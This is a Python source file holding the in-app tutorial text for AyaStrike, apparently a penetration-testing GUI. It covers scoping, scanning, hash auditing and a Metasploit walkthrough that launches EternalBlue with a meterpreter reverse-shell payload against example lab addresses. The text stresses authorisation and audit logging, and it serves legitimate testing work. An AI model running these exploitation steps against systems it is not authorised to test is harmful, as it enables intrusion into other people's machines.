"""In-app tutorial content for AyaStrike.

A single source of truth for the how-to text, surfaced in the GUI (Guide tab
and the Settings tab) and mirrored in the README. Each entry is
(section title, body). Plain text so it renders cleanly in a Tk Text widget.

made by Ruel.
"""

from __future__ import annotations

TUTORIALS: list[tuple[str, str]] = [
    ("Getting started", """\
AyaStrike organises an engagement into the 7 phases of a penetration test,
left to right across the tabs. A typical flow:

  1. Project  →  create a project for this engagement (one DB + audit log).
  2. ◈ Scope  →  add EVERY authorised target. Nothing can be probed unless it
                 is in scope. Keep "Enforce scope" ticked.
  3. Work the phase tabs in order: Recon → Scanning → Vuln → Services →
     Credentials → Exploitation.
  4. ◈ Findings  →  watch results and the live risk score build up.
  5. Reporting  →  generate a PDF/HTML/CSV report.
  6. ◈ Audit  →  every action is logged; use Verify Integrity any time.

In any module: fill the form, press ▶ Run. Output streams live; press ■ Stop
to cancel instantly. The rate limit (Settings) keeps scans polite."""),

    ("Setting your scope (do this first)", """\
The Scope tab is the safety core of AyaStrike. Add targets to the Allow list:

  • Single IP          203.0.113.10
  • CIDR network       192.168.56.0/24
  • Hostname           host.lab.example
  • Wildcard domain    *.lab.example   (matches any sub-domain)

Private/loopback ranges (10.x, 192.168.x, 127.x) are allowed by default for
home labs. Public targets must be added explicitly. The Deny list always wins —
use it to carve out hosts you must not touch. Click Save Scope when done.

If a module reports a "scope violation", the target is not authorised — add it
to scope (only if you are actually permitted to test it)."""),

    ("Phase 1-2: Recon & Scanning", """\
Recon (passive) never touches the target: WHOIS, DNS, subdomains (crt.sh +
wordlist), email harvest, Shodan (needs your API key in Settings), Wayback.

Scanning (active) does touch the target and is scope-checked:
  • Host Discovery   — find live hosts in a CIDR (no admin needed).
  • Port Scan        — pure-Python TCP connect; 'top', 'all', or 22,80,8000-8100.
  • Service Detect   — identify product/version on open ports.
  • Nmap             — wrapper for advanced scans (needs nmap installed).
  • SMB/SNMP/DNS enum, Web Directory Discovery.

Results populate the host/service inventory, which later phases reuse."""),

    ("Phase 3-4: Vulnerabilities & Services", """\
Vulnerability Assessment is DETECTION ONLY — no exploitation happens here:
  • CVE/CWE Matching — maps discovered versions to known CVEs (offline set +
    optional NVD lookup). Run Service Detection first so it has versions.
  • Web Security — missing headers, insecure cookies, version disclosure.
  • SSL/TLS Audit — cert validity/expiry and deprecated protocol support.
  • Misconfiguration — flags risky exposed services (databases, Redis, Telnet…).

Service Modules: web-app recon (methods/CORS/security.txt), passive wireless
survey, and cloud bucket exposure checks."""),

    ("Phase 5: Credential Toolkit", """\
  • Username Generator & Wordlist Generator — fully OFFLINE helpers.
  • Offline Hash Auditing — dictionary mode works with no special permission;
    it hashes a wordlist and compares against hashes you ALREADY possess from
    an authorised test. Supports md5/sha1/sha256/sha512/NTLM.
  • Brute-force (charset) mode and the Online Credential Test are DISABLED by
    default. They require an authorisation grant (see the next section) because
    they actively interact with systems / exhaustively guess. Online testing is
    for confirming weak/default creds on an in-scope host — not mass guessing.
    It is rate-limited, scope-checked, caps attempts, and stops at the first
    valid credential."""),

    ("Phase 6: Exploitation Interface (Metasploit) — full walkthrough", """\
AyaStrike does not ship exploits. The Exploitation tab is a controller for YOUR
own Metasploit Framework install, driven over its RPC API. Every launch is
scope-checked and PERMANENTLY logged (audit log + exploit_runs.log).

STEP 1 — Start Metasploit's RPC service (on the machine with Metasploit):
    msfrpcd -U msf -P yourpassword -p 55553
  (msfrpcd uses SSL by default. To disable SSL add -S and untick "MSF RPC SSL"
   in Settings.)

STEP 2 — Point AyaStrike at it (Settings tab):
    MSF RPC host  = 127.0.0.1   (or the Metasploit host)
    MSF RPC port  = 55553
    MSF RPC user  = msf
  The RPC password is entered per-run in the module form (never stored on disk).

STEP 3 — Search for a module (no authorisation needed; read-only):
    Exploitation ▸ "Metasploit: Search Modules"
    Search term  = eternalblue        (or: type:exploit smb, cve:2017-0144 …)
    MSF RPC password = yourpassword
    ▶ Run  →  the console lists matching module paths and ranks.

STEP 4 — Inspect options before you launch (read-only):
    "Metasploit: Module Info / Options"
    Module type = exploit
    Module path = windows/smb/ms17_010_eternalblue
    It prints the description plus the REQUIRED options (e.g. RHOSTS, and a
    payload for exploit modules).

STEP 5 — Authorise exploitation (one time per session):
    The first launch pops the red Authorisation dialog. Tick "I have WRITTEN
    authorisation…", type the phrase  I HAVE WRITTEN AUTHORISATION , and
    Authorise. This grant is in-memory only and is audit-logged. You can revoke
    it any time via Tools ▸ Revoke All Authorisations.

STEP 6 — Launch:
    "Metasploit: Launch Module (gated)"
    Module type = exploit
    Module path = windows/smb/ms17_010_eternalblue
    Options (one KEY=VALUE per line), e.g.:
        RHOSTS=192.168.56.10
        LHOST=192.168.56.1
        PAYLOAD=windows/x64/meterpreter/reverse_tcp
    MSF RPC password = yourpassword
    Confirm field    = windows/smb/ms17_010_eternalblue   (retype the name)
    ▶ Run.  RHOSTS is scope-checked; if the target isn't in scope it is refused.
    On success you get a job id — results appear as a session.

STEP 7 — Manage sessions:
    "Metasploit: Sessions" lists active sessions (type, peer, info). Use the
    Metasploit console for deep post-exploitation; AyaStrike logs that a session
    exists. Everything you launch is written to exploit_runs.log in the project
    folder for your records.

Reminder: only run this against systems you are explicitly, contractually
authorised to exploit."""),

    ("Phase 7: AI-Assisted Reporting", """\
Reporting ▸ "Generate Report" turns your findings into a professional report:
risk score (0-100 + rating), correlated attack paths, an executive summary and
consolidated remediation, exported to HTML, CSV and PDF (in the project's
reports/ folder).

The narrative is written by a LOCAL Ollama model so nothing leaves your machine
— set the Ollama host/model in Settings and run `ollama pull llama3.1` first.
If Ollama isn't running, the report falls back to clear templated text, so it
always produces a complete document."""),

    ("Audit log & responsible use", """\
Every action — scope changes, scans, authorisations, exploit launches, and any
scope violation — is appended to a tamper-evident, hash-chained audit log.
Tools ▸ Verify Audit Log (or the Audit tab ▸ Verify Integrity) re-walks the
chain and flags any tampering.

AyaStrike is for AUTHORISED testing only. Get written permission, stay in
scope, throttle your scans, and follow a responsible disclosure process for
anything you find. made by Ruel."""),
]


def as_plain_text() -> str:
    """Whole tutorial as one plain-text blob (used by the Guide/Settings view)."""
    out = []
    for i, (title, body) in enumerate(TUTORIALS, 1):
        out.append(f"{i}. {title}\n{'-' * (len(title) + 3)}\n{body}\n")
    return "\n".join(out)
